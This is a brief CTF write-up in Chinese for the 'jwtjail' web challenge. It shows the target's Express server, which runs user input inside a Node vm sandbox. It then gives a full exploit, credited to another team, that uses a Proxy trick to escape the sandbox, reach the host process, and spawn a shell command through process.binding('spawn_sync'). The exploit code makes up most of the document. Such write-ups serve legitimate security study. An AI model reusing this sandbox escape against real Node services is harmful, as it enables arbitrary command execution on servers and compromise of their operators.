## Web
### jwtjail
源码
```js
"use strict";

const jwt = require("jsonwebtoken");
const express = require("express");
const vm = require("vm");

const app = express();

const PORT = process.env.PORT || 12345;

app.use(express.urlencoded({ extended: false }));

const ctx = { codeGeneration: { strings: false, wasm: false }};
const unserialize = (data) => new vm.Script(`"use strict"; (${data})`).runInContext(vm.createContext(Object.create(null), ctx), { timeout: 250 });

process.mainModule = null; // 🙃

app.use(express.static("public"));

app.post("/api/verify", (req, res) => {
    let { token, secretOrPrivateKey } = req.body;
    try {
        token = unserialize(token);
        secretOrPrivateKey = unserialize(secretOrPrivateKey);
        res.json({
            success: true,
            data: jwt.verify(token, secretOrPrivateKey)
        });
    }
    catch {
        res.json({
            success: false,
            data: "Verification failed"
        });
    }
});

app.listen(PORT, () => console.log(`web/jwtjail listening on port ${PORT}`));
```

贴一手r3的exp

```js
const jwt = require('jsonwebtoken')// 
const endpoint = `http://localhost:8888`
const token = jwt.sign({}, 'a')
console.log(token)
fetch(endpoint + `/api/verify`, {  
    method: 'POST',  
    headers: {    'Content-Type': 'application/x-www-form-urlencoded'  },  
    body: new URLSearchParams({    
        token: `'${token}'`,    
        secretOrPrivateKey: 
        `(() => {  const c = (name, tar = {}) => new Proxy(    
            tar,    {      
                apply: (...args) => {        
                    try {          
                        const process = args[2].constructor.constructor.constructor('return process')()          
                        const flag = process.binding('spawn_sync').spawn({              
                            maxBuffer: 1048576,              
                            shell: true,              
                            args: [ '/bin/sh', '-c', "/readflag" ],              
                            cwd: undefined,              
                            detached: false,              
                            envPairs: ['PWD=/'],              
                            file: '/bin/sh',              
                            windowsHide: false,              
                            windowsVerbatimArguments: false,              
                            killSignal: undefined,              
                            stdio: [                
                                { type: 'pipe', readable: true, writable: false },                
                                { type: 'pipe', readable: false, writable: true },                
                                { type: 'pipe', readable: false, writable: true }              
                            ]            
                        }).output[1].toString().trim()          
                        console.log(flag)         
                        process.__proto__.__proto__.__proto__.constructor.prototype.toJSON = () => flag        
                    } catch (e) {          
                        console.log(e.stack)        
                    }      
                },      
                get: (...args) => {        
                    if(args[1] === Symbol.toPrimitive) {          
                        return c(name + '.' + String(args[1]), () => {            
                            throw new Error()          
                        });        
                    }        
                    return c(name + '.' + String(args[1]));      
                }    
            }  );  
            return c('a', {});})()`  })}).then((res) => res.text()).then(console.log)

```